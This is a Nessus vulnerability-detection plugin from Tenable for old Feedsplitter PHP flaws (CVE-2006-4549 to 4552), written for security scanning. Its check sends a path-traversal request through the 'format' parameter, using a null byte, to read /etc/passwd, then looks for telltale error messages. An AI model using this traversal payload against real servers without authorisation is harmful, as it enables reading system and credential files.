#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22295);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-4549", "CVE-2006-4550", "CVE-2006-4551", "CVE-2006-4552");
  script_bugtraq_id(19779);
  script_osvdb_id(29046, 29047, 29048, 29049);

  script_name(english:"Feedsplitter <= 2006-01-21 Multiple Remote Vulnerabilities (XSS, Traversal, Disc)");
  script_summary(english:"Tries to read an invalid XML file with Feedsplitter");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Feedsplitter, a PHP script for converting
RSS / RDF feeds into HTML. 

The version of Feedsplitter installed on the remote host fails to
properly validate the 'format' parameter of the 'feedsplitter.php'
script before using it to parse an arbitrary XML file.  An
unauthenticated attacker may be able to exploit this to discover the
contents of XML files or potentially even execute arbitrary PHP code. 

In addition, the application can optionally disclose the source of
feeds and may allow for arbitrary PHP code execution through the use
of a malicious feed." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/444805/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/31");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/30");
 script_cvs_date("$Date: 2011/03/14 21:48:04 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/feedsplitter", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/feedsplitter.php?",
      "format=", file, "%00&",
      "debug=1"
    ),
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not asnwer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an error about opening the file or...
    string("unable to parse context file ", file) >< res ||
    # magic_quotes_gpc was enabled or...
    string("file_get_contents(", file, "\\0.xml): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("file_get_contents(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    security_hole(port);
    exit(0);
  }
}
